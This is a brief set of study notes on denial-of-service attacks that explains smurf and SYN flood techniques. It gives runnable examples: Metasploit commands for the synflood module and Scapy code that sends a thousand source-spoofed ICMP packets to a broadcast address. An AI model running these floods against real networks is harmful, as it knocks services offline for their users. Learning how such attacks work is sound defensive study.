## Denial of service

Concept: Filling a storage area or communication channel until it can no longer be used.

### DoS by smurf

* The attacking machine sends a ping to broadcast servers
* The server echoes the request throughout the network
* All machines respond to the broadcast server
* The servers redirect the responses to the target.

### DoS by SYN flood

* Applies to the TCP protocol
* consists of sending a succession of SYN requests to the target



### Examples


**Metasploit**

```
use auxiliary/dos/tcp/synflood
show options
set RHOST=[IP_cible]
exploit
```

**Scapy**

```Python
i = IP()
i.dst = "192.168.133.255"

ping = ICMP()
requete = (i/ping)
send(requete) # run wireshark

# in 1 lign
send(IP(dst="192.168.133.255", src="192.168.133.129")/ICMP(), count=1000, verbose=1)
```
